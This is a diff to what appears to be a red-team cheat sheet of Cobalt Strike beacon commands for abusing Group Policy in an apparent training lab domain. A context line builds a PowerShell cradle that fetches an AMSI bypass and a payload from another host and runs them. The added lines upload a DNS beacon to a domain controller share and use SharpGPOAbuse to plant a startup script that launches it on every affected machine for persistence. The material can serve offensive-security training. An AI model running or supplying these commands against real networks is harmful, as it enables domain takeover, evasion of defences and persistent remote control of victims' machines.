@@ -1709,6 +1709,8 @@ beacon> powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" 
 # 4. Identify the systems under the given OU
 beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
 
+** Setting up a server in the current machine **
+
 # 5. Setup a smb listener and download & execute cradle pointing to port 80
 # Make sure to use AMSI Bypass with the powershell cradle.
 PS C:\> $str = "iex (iwr http://wkstn-2:8080/amsi-bypass.ps1 -UseBasicParsing) ; iex (iwr http://wkstn-2:8080/smb -UseBasicParsing);"
@@ -1739,6 +1741,21 @@ cmd> gpupdate /force
 # 11. Cleaup
 beacon> rportfwd stop 8080
 beacon> powershell Remove-NetFirewallRule -DisplayName "Rule 1"
+
+**# Using an available Share **
+
+# 5. Upload the DNS beacon to DC-2 share
+beacon> powerpick Find-DomainShare -CheckShareAccess
+beacon> cd \\dc-2\software
+beacon> upload C:\Payloads\dns_x64.exe
+
+# 6. Put a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism).
+beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
+
+# 7. Force GPO update
+cmd> gpupdate /force
+
+# 8. Reboot the machine
 
 #-------------------------------------------------------------------------------
 **# Create and Link new GPO**
